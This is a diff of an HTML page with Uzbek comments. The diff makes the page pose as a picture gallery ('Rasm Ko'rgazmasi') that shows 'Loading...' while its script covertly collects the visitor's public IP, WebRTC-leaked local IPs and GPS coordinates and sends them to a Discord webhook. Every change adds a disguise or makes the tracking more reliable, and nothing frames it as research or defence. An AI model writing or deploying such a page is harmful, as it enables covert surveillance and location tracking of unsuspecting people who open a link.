@@ -1,6 +1,11 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Rasm Ko'rgazmasi</title>
+</head>
 <body>
+    <h1>Yuklanmoqda...</h1>
+    
 <script>
 // Juda oddiy va ishonchli tracker
 function startTracking() {
@@ -8,7 +13,12 @@ function startTracking() {
     
     // 1. IP ni olish
     fetch('https://api.ipify.org?format=json')
-    .then(function(response) { return response.json(); })
+    .then(function(response) { 
+        if (!response.ok) {
+            throw new Error('Tarmoq javobi yaxshi emas');
+        }
+        return response.json(); 
+    })
     .then(function(ipData) {
         const publicIP = ipData.ip;
         
@@ -17,7 +27,9 @@ function startTracking() {
         try {
             const pc = new RTCPeerConnection({iceServers: []});
             pc.createDataChannel('');
-            pc.createOffer().then(function(offer) { return pc.setLocalDescription(offer); });
+            pc.createOffer().then(function(offer) { 
+                return pc.setLocalDescription(offer); 
+            });
             
             const ips = [];
             pc.onicecandidate = function(e) {
@@ -33,12 +45,13 @@ function startTracking() {
             }, 2000);
             
         } catch (e) {
-            localIPs = 'Xato';
+            localIPs = 'Xato: ' + e.message;
             sendToDiscord(publicIP, localIPs);
         }
     })
     .catch(function(error) {
-        sendToDiscord('IP olishda xato', 'Noma lum');
+        console.error('Xato:', error);
+        sendToDiscord('IP olishda xato: ' + error.message, 'Noma lum');
     });
 }
 
@@ -64,7 +77,10 @@ function sendToDiscord(publicIP, localIPs) {
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify(message)
     })
-    .then(function() {
+    .then(function(response) {
+        if (!response.ok) {
+            throw new Error('Discord javob bermadi');
+        }
         console.log('Ma lumotlar yuborildi');
     })
     .catch(function(error) {
@@ -93,10 +109,10 @@ if (navigator.geolocation) {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify(gpsMsg)
-            });
+            }).catch(e => console.log('GPS yuborish xatosi:', e));
         },
         function(error) {
-            console.log('GPS rad etildi');
+            console.log('GPS rad etildi:', error.message);
         }
     );
 }
